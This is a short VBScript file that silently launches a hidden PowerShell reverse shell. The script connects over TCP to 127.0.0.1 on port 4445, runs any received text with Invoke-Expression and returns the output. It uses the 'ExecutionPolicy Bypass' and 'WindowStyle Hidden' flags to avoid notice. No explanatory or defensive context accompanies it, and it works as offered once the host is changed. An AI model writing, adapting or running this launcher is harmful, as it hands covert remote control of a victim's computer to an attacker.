Set WshShell = CreateObject("WScript.Shell")
psCommand = "$Data = '127.0.0.1'; $Port = '4445'; $Client = New-Object System.Net.Sockets.TCPClient; $Client.Connect($Data, $Port); " & _
            "$Stream = $Client.GetStream(); $Writer = New-Object System.IO.StreamWriter($Stream); $Buffer = New-Object System.Byte[] 1024; " & _
            "$Encoding = New-Object System.Text.ASCIIEncoding; while($true) { Start-Sleep -Seconds 1; $Recv = $Stream.Read($Buffer, 0, 1024); " & _
            "if ($Recv -eq 0) { break } $Data = $Encoding.GetString($Buffer, 0, $Recv); $Response = Invoke-Expression $Data; " & _
            "$Response2 = 'PS ' + (Get-Location).Path + '> ' + $Response; $Writer.WriteLine($Response2); $Writer.Flush() } $Client.Close()"

WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & psCommand & """", 0, False